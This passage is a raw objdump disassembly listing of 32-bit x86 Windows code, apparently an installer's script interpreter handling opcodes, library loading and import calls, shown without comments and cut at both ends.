  401ddd:	0b ce                	or     %esi,%ecx
  401ddf:	eb e2                	jmp    0x401dc3
  401de1:	23 ce                	and    %esi,%ecx
  401de3:	eb de                	jmp    0x401dc3
  401de5:	33 ce                	xor    %esi,%ecx
  401de7:	eb da                	jmp    0x401dc3
  401de9:	33 c0                	xor    %eax,%eax
  401deb:	85 f6                	test   %esi,%esi
  401ded:	0f 94 c0             	sete   %al
  401df0:	8b f0                	mov    %eax,%esi
  401df2:	eb 2c                	jmp    0x401e20
  401df4:	85 f6                	test   %esi,%esi
  401df6:	75 04                	jne    0x401dfc
  401df8:	85 c9                	test   %ecx,%ecx
  401dfa:	74 09                	je     0x401e05
  401dfc:	33 f6                	xor    %esi,%esi
  401dfe:	46                   	inc    %esi
  401dff:	eb 1f                	jmp    0x401e20
  401e01:	85 f6                	test   %esi,%esi
  401e03:	75 f3                	jne    0x401df8
  401e05:	33 f6                	xor    %esi,%esi
  401e07:	eb 17                	jmp    0x401e20
  401e09:	85 c9                	test   %ecx,%ecx
  401e0b:	74 c5                	je     0x401dd2
  401e0d:	8b c6                	mov    %esi,%eax
  401e0f:	99                   	cltd
  401e10:	f7 f9                	idiv   %ecx
  401e12:	8b f2                	mov    %edx,%esi
  401e14:	eb 0a                	jmp    0x401e20
  401e16:	d3 e6                	shl    %cl,%esi
  401e18:	eb 06                	jmp    0x401e20
  401e1a:	d3 fe                	sar    %cl,%esi
  401e1c:	eb 02                	jmp    0x401e20
  401e1e:	d3 ee                	shr    %cl,%esi
  401e20:	56                   	push   %esi
  401e21:	e9 3e f9 ff ff       	jmp    0x401764
  401e26:	33 f6                	xor    %esi,%esi
  401e28:	46                   	inc    %esi
  401e29:	e8 29 f6 ff ff       	call   0x401457
  401e2e:	6a 02                	push   $0x2
  401e30:	59                   	pop    %ecx
  401e31:	8b f0                	mov    %eax,%esi
  401e33:	e8 02 f6 ff ff       	call   0x40143a
  401e38:	50                   	push   %eax
  401e39:	56                   	push   %esi
  401e3a:	53                   	push   %ebx
  401e3b:	89 55 1c             	mov    %edx,0x1c(%ebp)
  401e3e:	ff 15 4c 92 40 00    	call   *0x40924c
  401e44:	83 c4 0c             	add    $0xc,%esp
  401e47:	e9 21 11 00 00       	jmp    0x402f6d
  401e4c:	8b 45 4c             	mov    0x4c(%ebp),%eax
  401e4f:	85 c0                	test   %eax,%eax
  401e51:	8b 35 04 b1 40 00    	mov    0x40b104,%esi
  401e57:	74 50                	je     0x401ea9
  401e59:	48                   	dec    %eax
  401e5a:	85 f6                	test   %esi,%esi
  401e5c:	74 0a                	je     0x401e68
  401e5e:	85 c0                	test   %eax,%eax
  401e60:	8b 36                	mov    (%esi),%esi
  401e62:	75 f5                	jne    0x401e59
  401e64:	85 f6                	test   %esi,%esi
  401e66:	75 14                	jne    0x401e7c
  401e68:	68 10 00 20 00       	push   $0x200010
  401e6d:	6a e8                	push   $0xffffffe8
  401e6f:	6a 00                	push   $0x0
  401e71:	e8 6b 4a 00 00       	call   0x4068e1
  401e76:	50                   	push   %eax
  401e77:	e9 cc fc ff ff       	jmp    0x401b48
  401e7c:	8d 7e 04             	lea    0x4(%esi),%edi
  401e7f:	57                   	push   %edi
  401e80:	be 68 b1 40 00       	mov    $0x40b168,%esi
  401e85:	56                   	push   %esi
  401e86:	e8 3c 46 00 00       	call   0x4064c7
  401e8b:	a1 04 b1 40 00       	mov    0x40b104,%eax
  401e90:	83 c0 04             	add    $0x4,%eax
  401e93:	50                   	push   %eax
  401e94:	57                   	push   %edi
  401e95:	e8 2d 46 00 00       	call   0x4064c7
  401e9a:	a1 04 b1 40 00       	mov    0x40b104,%eax
  401e9f:	56                   	push   %esi
  401ea0:	83 c0 04             	add    $0x4,%eax
  401ea3:	50                   	push   %eax
  401ea4:	e9 96 0d 00 00       	jmp    0x402c3f
  401ea9:	83 7d 48 00          	cmpl   $0x0,0x48(%ebp)
  401ead:	74 1f                	je     0x401ece
  401eaf:	85 f6                	test   %esi,%esi
  401eb1:	0f 84 02 f9 ff ff    	je     0x4017b9
  401eb7:	8d 46 04             	lea    0x4(%esi),%eax
  401eba:	50                   	push   %eax
  401ebb:	53                   	push   %ebx
  401ebc:	e8 06 46 00 00       	call   0x4064c7
  401ec1:	8b 06                	mov    (%esi),%eax
  401ec3:	a3 04 b1 40 00       	mov    %eax,0x40b104
  401ec8:	56                   	push   %esi
  401ec9:	e9 bc 04 00 00       	jmp    0x40238a
  401ece:	68 04 08 00 00       	push   $0x804
  401ed3:	6a 40                	push   $0x40
  401ed5:	ff 15 2c 91 40 00    	call   *0x40912c
  401edb:	ff 75 44             	push   0x44(%ebp)
  401ede:	8b f0                	mov    %eax,%esi
  401ee0:	8d 46 04             	lea    0x4(%esi),%eax
  401ee3:	50                   	push   %eax
  401ee4:	e8 f8 49 00 00       	call   0x4068e1
  401ee9:	a1 04 b1 40 00       	mov    0x40b104,%eax
  401eee:	89 06                	mov    %eax,(%esi)
  401ef0:	89 35 04 b1 40 00    	mov    %esi,0x40b104
  401ef6:	e9 72 10 00 00       	jmp    0x402f6d
  401efb:	6a 03                	push   $0x3
  401efd:	59                   	pop    %ecx
  401efe:	e8 37 f5 ff ff       	call   0x40143a
  401f03:	6a 04                	push   $0x4
  401f05:	59                   	pop    %ecx
  401f06:	89 55 1c             	mov    %edx,0x1c(%ebp)
  401f09:	89 45 2c             	mov    %eax,0x2c(%ebp)
  401f0c:	e8 29 f5 ff ff       	call   0x40143a
  401f11:	f6 45 58 01          	testb  $0x1,0x58(%ebp)
  401f15:	89 55 1c             	mov    %edx,0x1c(%ebp)
  401f18:	89 45 7c             	mov    %eax,0x7c(%ebp)
  401f1b:	74 0b                	je     0x401f28
  401f1d:	6a 33                	push   $0x33
  401f1f:	5e                   	pop    %esi
  401f20:	e8 32 f5 ff ff       	call   0x401457
  401f25:	89 45 2c             	mov    %eax,0x2c(%ebp)
  401f28:	f6 45 58 02          	testb  $0x2,0x58(%ebp)
  401f2c:	74 0b                	je     0x401f39
  401f2e:	6a 44                	push   $0x44
  401f30:	5e                   	pop    %esi
  401f31:	e8 21 f5 ff ff       	call   0x401457
  401f36:	89 45 7c             	mov    %eax,0x7c(%ebp)
  401f39:	83 7d 40 23          	cmpl   $0x23,0x40(%ebp)
  401f3d:	75 4f                	jne    0x401f8e
  401f3f:	33 c9                	xor    %ecx,%ecx
  401f41:	41                   	inc    %ecx
  401f42:	e8 f3 f4 ff ff       	call   0x40143a
  401f47:	6a 02                	push   $0x2
  401f49:	59                   	pop    %ecx
  401f4a:	8b f0                	mov    %eax,%esi
  401f4c:	89 55 1c             	mov    %edx,0x1c(%ebp)
  401f4f:	e8 e6 f4 ff ff       	call   0x40143a
  401f54:	8b 4d 58             	mov    0x58(%ebp),%ecx
  401f57:	c1 f9 02             	sar    $0x2,%ecx
  401f5a:	89 55 1c             	mov    %edx,0x1c(%ebp)
  401f5d:	74 1f                	je     0x401f7e
  401f5f:	8d 55 68             	lea    0x68(%ebp),%edx
  401f62:	52                   	push   %edx
  401f63:	51                   	push   %ecx
  401f64:	6a 00                	push   $0x0
  401f66:	ff 75 7c             	push   0x7c(%ebp)
  401f69:	ff 75 2c             	push   0x2c(%ebp)
  401f6c:	50                   	push   %eax
  401f6d:	56                   	push   %esi
  401f6e:	ff 15 50 92 40 00    	call   *0x409250
  401f74:	f7 d8                	neg    %eax
  401f76:	1b c0                	sbb    %eax,%eax
  401f78:	40                   	inc    %eax
  401f79:	89 45 70             	mov    %eax,0x70(%ebp)
  401f7c:	eb 47                	jmp    0x401fc5
  401f7e:	ff 75 7c             	push   0x7c(%ebp)
  401f81:	ff 75 2c             	push   0x2c(%ebp)
  401f84:	50                   	push   %eax
  401f85:	56                   	push   %esi
  401f86:	ff 15 78 92 40 00    	call   *0x409278
  401f8c:	eb 34                	jmp    0x401fc2
  401f8e:	33 f6                	xor    %esi,%esi
  401f90:	46                   	inc    %esi
  401f91:	e8 c1 f4 ff ff       	call   0x401457
  401f96:	6a 12                	push   $0x12
  401f98:	5e                   	pop    %esi
  401f99:	8b f8                	mov    %eax,%edi
  401f9b:	e8 b7 f4 ff ff       	call   0x401457
  401fa0:	66 8b 08             	mov    (%eax),%cx
  401fa3:	66 f7 d9             	neg    %cx
  401fa6:	1b c9                	sbb    %ecx,%ecx
  401fa8:	23 c8                	and    %eax,%ecx
  401faa:	66 8b 07             	mov    (%edi),%ax
  401fad:	66 f7 d8             	neg    %ax
  401fb0:	51                   	push   %ecx
  401fb1:	1b c0                	sbb    %eax,%eax
  401fb3:	23 c7                	and    %edi,%eax
  401fb5:	50                   	push   %eax
  401fb6:	ff 75 7c             	push   0x7c(%ebp)
  401fb9:	ff 75 2c             	push   0x2c(%ebp)
  401fbc:	ff 15 54 92 40 00    	call   *0x409254
  401fc2:	89 45 68             	mov    %eax,0x68(%ebp)
  401fc5:	83 7d 44 00          	cmpl   $0x0,0x44(%ebp)
  401fc9:	0f 8c 9e 0f 00 00    	jl     0x402f6d
  401fcf:	ff 75 68             	push   0x68(%ebp)
  401fd2:	e9 8d f7 ff ff       	jmp    0x401764
  401fd7:	33 c9                	xor    %ecx,%ecx
  401fd9:	e8 5c f4 ff ff       	call   0x40143a
  401fde:	50                   	push   %eax
  401fdf:	89 55 1c             	mov    %edx,0x1c(%ebp)
  401fe2:	ff 15 58 92 40 00    	call   *0x409258
  401fe8:	e9 8c f8 ff ff       	jmp    0x401879
  401fed:	6a 02                	push   $0x2
  401fef:	59                   	pop    %ecx
  401ff0:	e8 45 f4 ff ff       	call   0x40143a
  401ff5:	33 c9                	xor    %ecx,%ecx
  401ff7:	41                   	inc    %ecx
  401ff8:	8b f0                	mov    %eax,%esi
  401ffa:	89 55 1c             	mov    %edx,0x1c(%ebp)
  401ffd:	e8 38 f4 ff ff       	call   0x40143a
  402002:	56                   	push   %esi
  402003:	50                   	push   %eax
  402004:	89 55 1c             	mov    %edx,0x1c(%ebp)
  402007:	ff 15 5c 92 40 00    	call   *0x40925c
  40200d:	e9 2f fc ff ff       	jmp    0x401c41
  402012:	8b 4d 48             	mov    0x48(%ebp),%ecx
  402015:	a1 c8 a5 42 00       	mov    0x42a5c8,%eax
  40201a:	8d 34 08             	lea    (%eax,%ecx,1),%esi
  40201d:	33 c9                	xor    %ecx,%ecx
  40201f:	e8 16 f4 ff ff       	call   0x40143a
  402024:	56                   	push   %esi
  402025:	6a eb                	push   $0xffffffeb
  402027:	50                   	push   %eax
  402028:	89 55 1c             	mov    %edx,0x1c(%ebp)
  40202b:	ff 15 60 92 40 00    	call   *0x409260
  402031:	e9 37 0f 00 00       	jmp    0x402f6d
  402036:	66 f7 45 50 00 01    	testw  $0x100,0x50(%ebp)
  40203c:	74 0d                	je     0x40204b
  40203e:	6a 02                	push   $0x2
  402040:	59                   	pop    %ecx
  402041:	e8 f4 f3 ff ff       	call   0x40143a
  402046:	89 55 1c             	mov    %edx,0x1c(%ebp)
  402049:	eb 0a                	jmp    0x402055
  40204b:	ff 75 4c             	push   0x4c(%ebp)
  40204e:	52                   	push   %edx
  40204f:	ff 15 5c 92 40 00    	call   *0x40925c
  402055:	8b 4d 50             	mov    0x50(%ebp),%ecx
  402058:	89 45 7c             	mov    %eax,0x7c(%ebp)
  40205b:	8b c1                	mov    %ecx,%eax
  40205d:	c1 e8 1f             	shr    $0x1f,%eax
  402060:	89 45 3c             	mov    %eax,0x3c(%ebp)
  402063:	8b c1                	mov    %ecx,%eax
  402065:	c1 e8 1e             	shr    $0x1e,%eax
  402068:	8b f1                	mov    %ecx,%esi
  40206a:	8b f9                	mov    %ecx,%edi
  40206c:	83 e6 03             	and    $0x3,%esi
  40206f:	83 e0 01             	and    $0x1,%eax
  402072:	83 e7 04             	and    $0x4,%edi
  402075:	f7 c1 00 00 01 00    	test   $0x10000,%ecx
  40207b:	89 75 34             	mov    %esi,0x34(%ebp)
  40207e:	89 45 68             	mov    %eax,0x68(%ebp)
  402081:	74 0d                	je     0x402090
  402083:	6a 11                	push   $0x11
  402085:	5e                   	pop    %esi
  402086:	e8 cc f3 ff ff       	call   0x401457
  40208b:	8b 75 34             	mov    0x34(%ebp),%esi
  40208e:	eb 04                	jmp    0x402094
  402090:	0f b7 45 48          	movzwl 0x48(%ebp),%eax
  402094:	89 45 1c             	mov    %eax,0x1c(%ebp)
  402097:	8d 45 20             	lea    0x20(%ebp),%eax
  40209a:	50                   	push   %eax
  40209b:	ff 75 7c             	push   0x7c(%ebp)
  40209e:	ff 15 84 92 40 00    	call   *0x409284
  4020a4:	8b 45 50             	mov    0x50(%ebp),%eax
  4020a7:	25 f0 fe 00 00       	and    $0xfef0,%eax
  4020ac:	50                   	push   %eax
  4020ad:	8b 45 2c             	mov    0x2c(%ebp),%eax
  4020b0:	0f af 45 68          	imul   0x68(%ebp),%eax
  4020b4:	50                   	push   %eax
  4020b5:	8b 45 28             	mov    0x28(%ebp),%eax
  4020b8:	0f af 45 3c          	imul   0x3c(%ebp),%eax
  4020bc:	50                   	push   %eax
  4020bd:	f7 df                	neg    %edi
  4020bf:	56                   	push   %esi
  4020c0:	ff 75 1c             	push   0x1c(%ebp)
  4020c3:	1b ff                	sbb    %edi,%edi
  4020c5:	23 3d 88 a5 42 00    	and    0x42a588,%edi
  4020cb:	57                   	push   %edi
  4020cc:	ff 15 64 92 40 00    	call   *0x409264
  4020d2:	8b f8                	mov    %eax,%edi
  4020d4:	57                   	push   %edi
  4020d5:	56                   	push   %esi
  4020d6:	68 72 01 00 00       	push   $0x172
  4020db:	ff 75 7c             	push   0x7c(%ebp)
  4020de:	ff 15 78 92 40 00    	call   *0x409278
  4020e4:	85 c0                	test   %eax,%eax
  4020e6:	74 0b                	je     0x4020f3
  4020e8:	85 f6                	test   %esi,%esi
  4020ea:	75 07                	jne    0x4020f3
  4020ec:	50                   	push   %eax
  4020ed:	ff 15 50 90 40 00    	call   *0x409050
  4020f3:	83 7d 44 00          	cmpl   $0x0,0x44(%ebp)
  4020f7:	0f 8c 70 0e 00 00    	jl     0x402f6d
  4020fd:	57                   	push   %edi
  4020fe:	e9 61 f6 ff ff       	jmp    0x401764
  402103:	52                   	push   %edx
  402104:	ff 15 68 92 40 00    	call   *0x409268
  40210a:	6a 02                	push   $0x2
  40210c:	59                   	pop    %ecx
  40210d:	8b f0                	mov    %eax,%esi
  40210f:	e8 26 f3 ff ff       	call   0x40143a
  402114:	6a 48                	push   $0x48
  402116:	6a 5a                	push   $0x5a
  402118:	56                   	push   %esi
  402119:	8b f8                	mov    %eax,%edi
  40211b:	89 55 1c             	mov    %edx,0x1c(%ebp)
  40211e:	ff 15 48 90 40 00    	call   *0x409048
  402124:	50                   	push   %eax
  402125:	57                   	push   %edi
  402126:	ff 15 68 91 40 00    	call   *0x409168
  40212c:	56                   	push   %esi
  40212d:	ff 75 64             	push   0x64(%ebp)
  402130:	f7 d8                	neg    %eax
  402132:	a3 08 b1 40 00       	mov    %eax,0x40b108
  402137:	ff 15 6c 92 40 00    	call   *0x40926c
  40213d:	6a 03                	push   $0x3
  40213f:	59                   	pop    %ecx
  402140:	e8 f5 f2 ff ff       	call   0x40143a
  402145:	ff 75 48             	push   0x48(%ebp)
  402148:	a3 18 b1 40 00       	mov    %eax,0x40b118
  40214d:	8a 45 54             	mov    0x54(%ebp),%al
  402150:	8a c8                	mov    %al,%cl
  402152:	80 e1 01             	and    $0x1,%cl
  402155:	88 0d 1c b1 40 00    	mov    %cl,0x40b11c
  40215b:	8a c8                	mov    %al,%cl
  40215d:	80 e1 02             	and    $0x2,%cl
  402160:	24 04                	and    $0x4,%al
  402162:	68 24 b1 40 00       	push   $0x40b124
  402167:	89 55 1c             	mov    %edx,0x1c(%ebp)
  40216a:	88 0d 1d b1 40 00    	mov    %cl,0x40b11d
  402170:	a2 1e b1 40 00       	mov    %al,0x40b11e
  402175:	c6 05 1f b1 40 00 01 	movb   $0x1,0x40b11f
  40217c:	e8 60 47 00 00       	call   0x4068e1
  402181:	68 08 b1 40 00       	push   $0x40b108
  402186:	ff 15 60 90 40 00    	call   *0x409060
  40218c:	e9 b0 fa ff ff       	jmp    0x401c41
  402191:	33 c9                	xor    %ecx,%ecx
  402193:	e8 a2 f2 ff ff       	call   0x40143a
  402198:	33 c9                	xor    %ecx,%ecx
  40219a:	41                   	inc    %ecx
  40219b:	8b f0                	mov    %eax,%esi
  40219d:	89 55 1c             	mov    %edx,0x1c(%ebp)
  4021a0:	e8 95 f2 ff ff       	call   0x40143a
  4021a5:	83 7d 50 00          	cmpl   $0x0,0x50(%ebp)
  4021a9:	50                   	push   %eax
  4021aa:	89 55 1c             	mov    %edx,0x1c(%ebp)
  4021ad:	56                   	push   %esi
  4021ae:	75 0b                	jne    0x4021bb
  4021b0:	ff 15 48 92 40 00    	call   *0x409248
  4021b6:	e9 b2 0d 00 00       	jmp    0x402f6d
  4021bb:	ff 15 70 92 40 00    	call   *0x409270
  4021c1:	e9 a7 0d 00 00       	jmp    0x402f6d
  4021c6:	33 f6                	xor    %esi,%esi
  4021c8:	e8 8a f2 ff ff       	call   0x401457
  4021cd:	6a 31                	push   $0x31
  4021cf:	5e                   	pop    %esi
  4021d0:	8b f8                	mov    %eax,%edi
  4021d2:	e8 80 f2 ff ff       	call   0x401457
  4021d7:	6a 22                	push   $0x22
  4021d9:	5e                   	pop    %esi
  4021da:	89 45 7c             	mov    %eax,0x7c(%ebp)
  4021dd:	e8 75 f2 ff ff       	call   0x401457
  4021e2:	6a 15                	push   $0x15
  4021e4:	5e                   	pop    %esi
  4021e5:	8b d8                	mov    %eax,%ebx
  4021e7:	e8 6b f2 ff ff       	call   0x401457
  4021ec:	6a ec                	push   $0xffffffec
  4021ee:	e8 36 f2 ff ff       	call   0x401429
  4021f3:	8b 45 54             	mov    0x54(%ebp),%eax
  4021f6:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4021f9:	8b 45 64             	mov    0x64(%ebp),%eax
  4021fc:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4021ff:	8b 45 50             	mov    0x50(%ebp),%eax
  402202:	89 45 00             	mov    %eax,0x0(%ebp)
  402205:	66 8b 07             	mov    (%edi),%ax
  402208:	66 f7 d8             	neg    %ax
  40220b:	1b c0                	sbb    %eax,%eax
  40220d:	23 c7                	and    %edi,%eax
  40220f:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402212:	8b 45 7c             	mov    0x7c(%ebp),%eax
  402215:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402218:	66 8b 03             	mov    (%ebx),%ax
  40221b:	66 f7 d8             	neg    %ax
  40221e:	c7 45 fc 00 60 43 00 	movl   $0x436000,-0x4(%ebp)
  402225:	1b c0                	sbb    %eax,%eax
  402227:	23 c3                	and    %ebx,%eax
  402229:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40222c:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40222f:	50                   	push   %eax
  402230:	e8 3d 3d 00 00       	call   0x405f72
  402235:	85 c0                	test   %eax,%eax
  402237:	0f 84 7c f5 ff ff    	je     0x4017b9
  40223d:	f6 45 e8 40          	testb  $0x40,-0x18(%ebp)
  402241:	0f 84 26 0d 00 00    	je     0x402f6d
  402247:	ff 75 1c             	push   0x1c(%ebp)
  40224a:	e8 a4 44 00 00       	call   0x4066f3
  40224f:	ff 75 1c             	push   0x1c(%ebp)
  402252:	ff 15 1c 91 40 00    	call   *0x40911c
  402258:	e9 10 0d 00 00       	jmp    0x402f6d
  40225d:	33 f6                	xor    %esi,%esi
  40225f:	e8 f3 f1 ff ff       	call   0x401457
  402264:	8b f0                	mov    %eax,%esi
  402266:	56                   	push   %esi
  402267:	6a eb                	push   $0xffffffeb
  402269:	e8 d0 2f 00 00       	call   0x40523e
  40226e:	56                   	push   %esi
  40226f:	e8 bb 3c 00 00       	call   0x405f2f
  402274:	8b f0                	mov    %eax,%esi
  402276:	85 f6                	test   %esi,%esi
  402278:	0f 84 3b f5 ff ff    	je     0x4017b9
  40227e:	83 7d 4c 00          	cmpl   $0x0,0x4c(%ebp)
  402282:	74 22                	je     0x4022a6
  402284:	56                   	push   %esi
  402285:	e8 69 44 00 00       	call   0x4066f3
  40228a:	83 7d 48 00          	cmpl   $0x0,0x48(%ebp)
  40228e:	7c 0b                	jl     0x40229b
  402290:	50                   	push   %eax
  402291:	ff 75 6c             	push   0x6c(%ebp)
  402294:	e8 75 41 00 00       	call   0x40640e
  402299:	eb 0b                	jmp    0x4022a6
  40229b:	85 c0                	test   %eax,%eax
  40229d:	74 07                	je     0x4022a6
  40229f:	c7 45 70 01 00 00 00 	movl   $0x1,0x70(%ebp)
  4022a6:	56                   	push   %esi
  4022a7:	eb a9                	jmp    0x402252
  4022a9:	6a 02                	push   $0x2
  4022ab:	5e                   	pop    %esi
  4022ac:	e8 a6 f1 ff ff       	call   0x401457
  4022b1:	50                   	push   %eax
  4022b2:	e8 fc 42 00 00       	call   0x4065b3
  4022b7:	8b f0                	mov    %eax,%esi
  4022b9:	85 f6                	test   %esi,%esi
  4022bb:	74 13                	je     0x4022d0
  4022bd:	ff 76 14             	push   0x14(%esi)
  4022c0:	ff 75 6c             	push   0x6c(%ebp)
  4022c3:	e8 46 41 00 00       	call   0x40640e
  4022c8:	ff 76 18             	push   0x18(%esi)
  4022cb:	e9 94 f4 ff ff       	jmp    0x401764
  4022d0:	8b 45 6c             	mov    0x6c(%ebp),%eax
  4022d3:	66 83 23 00          	andw   $0x0,(%ebx)
  4022d7:	66 83 20 00          	andw   $0x0,(%eax)
  4022db:	e9 d9 f4 ff ff       	jmp    0x4017b9
  4022e0:	6a ee                	push   $0xffffffee
  4022e2:	5e                   	pop    %esi
  4022e3:	e8 6f f1 ff ff       	call   0x401457
  4022e8:	8b f8                	mov    %eax,%edi
  4022ea:	8d 45 3c             	lea    0x3c(%ebp),%eax
  4022ed:	50                   	push   %eax
  4022ee:	57                   	push   %edi
  4022ef:	6a 0c                	push   $0xc
  4022f1:	e8 54 43 00 00       	call   0x40664a
  4022f6:	ff d0                	call   *%eax
  4022f8:	66 83 23 00          	andw   $0x0,(%ebx)
  4022fc:	8b f0                	mov    %eax,%esi
  4022fe:	8b 45 6c             	mov    0x6c(%ebp),%eax
  402301:	66 83 20 00          	andw   $0x0,(%eax)
  402305:	85 f6                	test   %esi,%esi
  402307:	c7 45 70 01 00 00 00 	movl   $0x1,0x70(%ebp)
  40230e:	0f 84 59 0c 00 00    	je     0x402f6d
  402314:	56                   	push   %esi
  402315:	6a 40                	push   $0x40
  402317:	ff 15 2c 91 40 00    	call   *0x40912c
  40231d:	85 c0                	test   %eax,%eax
  40231f:	89 45 7c             	mov    %eax,0x7c(%ebp)
  402322:	0f 84 45 0c 00 00    	je     0x402f6d
  402328:	6a 0d                	push   $0xd
  40232a:	e8 1b 43 00 00       	call   0x40664a
  40232f:	6a 0e                	push   $0xe
  402331:	89 45 34             	mov    %eax,0x34(%ebp)
  402334:	e8 11 43 00 00       	call   0x40664a
  402339:	ff 75 7c             	push   0x7c(%ebp)
  40233c:	89 45 68             	mov    %eax,0x68(%ebp)
  40233f:	56                   	push   %esi
  402340:	6a 00                	push   $0x0
  402342:	57                   	push   %edi
  402343:	ff 55 34             	call   *0x34(%ebp)
  402346:	85 c0                	test   %eax,%eax
  402348:	74 3d                	je     0x402387
  40234a:	8d 45 2c             	lea    0x2c(%ebp),%eax
  40234d:	50                   	push   %eax
  40234e:	8d 45 1c             	lea    0x1c(%ebp),%eax
  402351:	50                   	push   %eax
  402352:	68 c8 92 40 00       	push   $0x4092c8
  402357:	ff 75 7c             	push   0x7c(%ebp)
  40235a:	ff 55 68             	call   *0x68(%ebp)
  40235d:	85 c0                	test   %eax,%eax
  40235f:	74 26                	je     0x402387
  402361:	8b 45 1c             	mov    0x1c(%ebp),%eax
  402364:	8b 4d 50             	mov    0x50(%ebp),%ecx
  402367:	ff 74 88 08          	push   0x8(%eax,%ecx,4)
  40236b:	53                   	push   %ebx
  40236c:	e8 9d 40 00 00       	call   0x40640e
  402371:	8b 45 50             	mov    0x50(%ebp),%eax
  402374:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  402377:	ff 74 81 0c          	push   0xc(%ecx,%eax,4)
  40237b:	ff 75 6c             	push   0x6c(%ebp)
  40237e:	e8 8b 40 00 00       	call   0x40640e
  402383:	83 65 70 00          	andl   $0x0,0x70(%ebp)
  402387:	ff 75 7c             	push   0x7c(%ebp)
  40238a:	ff 15 30 91 40 00    	call   *0x409130
  402390:	e9 d8 0b 00 00       	jmp    0x402f6d
  402395:	83 3d 80 a6 42 00 00 	cmpl   $0x0,0x42a680
  40239c:	c7 45 70 01 00 00 00 	movl   $0x1,0x70(%ebp)
  4023a3:	0f 8c b8 00 00 00    	jl     0x402461
  4023a9:	6a f0                	push   $0xfffffff0
  4023ab:	5e                   	pop    %esi
  4023ac:	e8 a6 f0 ff ff       	call   0x401457
  4023b1:	33 f6                	xor    %esi,%esi
  4023b3:	46                   	inc    %esi
  4023b4:	8b d8                	mov    %eax,%ebx
  4023b6:	e8 9c f0 ff ff       	call   0x401457
  4023bb:	83 7d 54 00          	cmpl   $0x0,0x54(%ebp)
  4023bf:	89 45 7c             	mov    %eax,0x7c(%ebp)
  4023c2:	74 0d                	je     0x4023d1
  4023c4:	53                   	push   %ebx
  4023c5:	ff 15 34 91 40 00    	call   *0x409134
  4023cb:	8b f0                	mov    %eax,%esi
  4023cd:	85 f6                	test   %esi,%esi
  4023cf:	75 11                	jne    0x4023e2
  4023d1:	6a 08                	push   $0x8
  4023d3:	6a 00                	push   $0x0
  4023d5:	53                   	push   %ebx
  4023d6:	ff 15 38 91 40 00    	call   *0x409138
  4023dc:	8b f0                	mov    %eax,%esi
  4023de:	85 f6                	test   %esi,%esi
  4023e0:	74 78                	je     0x40245a
  4023e2:	ff 75 7c             	push   0x7c(%ebp)
  4023e5:	56                   	push   %esi
  4023e6:	e8 cc 42 00 00       	call   0x4066b7
  4023eb:	8b d8                	mov    %eax,%ebx
  4023ed:	85 db                	test   %ebx,%ebx
  4023ef:	74 3b                	je     0x40242c
  4023f1:	83 65 70 00          	andl   $0x0,0x70(%ebp)
  4023f5:	83 7d 4c 00          	cmpl   $0x0,0x4c(%ebp)
  4023f9:	74 17                	je     0x402412
  4023fb:	ff 75 4c             	push   0x4c(%ebp)
  4023fe:	e8 26 f0 ff ff       	call   0x401429
  402403:	ff d3                	call   *%ebx
  402405:	85 c0                	test   %eax,%eax
  402407:	74 2d                	je     0x402436
  402409:	c7 45 70 01 00 00 00 	movl   $0x1,0x70(%ebp)
  402410:	eb 24                	jmp    0x402436
  402412:	68 00 b0 40 00       	push   $0x40b000
  402417:	68 04 b1 40 00       	push   $0x40b104
  40241c:	57                   	push   %edi
  40241d:	68 00 04 00 00       	push   $0x400
  402422:	ff 75 64             	push   0x64(%ebp)
  402425:	ff d3                	call   *%ebx
  402427:	83 c4 14             	add    $0x14,%esp
  40242a:	eb 0a                	jmp    0x402436
  40242c:	ff 75 7c             	push   0x7c(%ebp)
  40242f:	6a f7                	push   $0xfffffff7
  402431:	e8 08 2e 00 00       	call   0x40523e
  402436:	83 7d 50 00          	cmpl   $0x0,0x50(%ebp)
  40243a:	0f 85 2d 0b 00 00    	jne    0x402f6d
  402440:	56                   	push   %esi
  402441:	e8 a8 1b 00 00       	call   0x403fee
  402446:	85 c0                	test   %eax,%eax
  402448:	0f 84 1f 0b 00 00    	je     0x402f6d
  40244e:	56                   	push   %esi
  40244f:	ff 15 3c 91 40 00    	call   *0x40913c
  402455:	e9 13 0b 00 00       	jmp    0x402f6d
  40245a:	6a f6                	push   $0xfffffff6
  40245c:	e9 01 f4 ff ff       	jmp    0x401862
  402461:	6a e7                	push   $0xffffffe7
  402463:	e9 fa f3 ff ff       	jmp    0x401862
  402468:	6a f0                	push   $0xfffffff0
  40246a:	5e                   	pop    %esi
  40246b:	e8 e7 ef ff ff       	call   0x401457
  402470:	6a df                	push   $0xffffffdf
  402472:	5e                   	pop    %esi
  402473:	89 45 6c             	mov    %eax,0x6c(%ebp)
  402476:	e8 dc ef ff ff       	call   0x401457
  40247b:	6a 02                	push   $0x2
  40247d:	5e                   	pop    %esi
  40247e:	89 45 1c             	mov    %eax,0x1c(%ebp)
  402481:	e8 d1 ef ff ff       	call   0x401457
  402486:	6a cd                	push   $0xffffffcd
  402488:	5e                   	pop    %esi
  402489:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40248c:	e8 c6 ef ff ff       	call   0x401457
  402491:	6a 45                	push   $0x45
  402493:	5e                   	pop    %esi
  402494:	89 45 3c             	mov    %eax,0x3c(%ebp)
  402497:	e8 bb ef ff ff       	call   0x401457
  40249c:	ff 75 1c             	push   0x1c(%ebp)
  40249f:	89 45 64             	mov    %eax,0x64(%ebp)
  4024a2:	8b 45 54             	mov    0x54(%ebp),%eax
  4024a5:	8b c8                	mov    %eax,%ecx
  4024a7:	8b d8                	mov    %eax,%ebx
  4024a9:	8b f8                	mov    %eax,%edi
  4024ab:	c1 f8 10             	sar    $0x10,%eax
  4024ae:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
  4024b4:	25 ff ff 00 00       	and    $0xffff,%eax
  4024b9:	c1 ff 0c             	sar    $0xc,%edi
  4024bc:	89 4d 2c             	mov    %ecx,0x2c(%ebp)
  4024bf:	81 e3 00 80 00 00    	and    $0x8000,%ebx
  4024c5:	83 e7 07             	and    $0x7,%edi
  4024c8:	89 45 68             	mov    %eax,0x68(%ebp)
  4024cb:	e8 5f 3b 00 00       	call   0x40602f
  4024d0:	85 c0                	test   %eax,%eax
  4024d2:	75 08                	jne    0x4024dc
  4024d4:	6a 21                	push   $0x21
  4024d6:	5e                   	pop    %esi
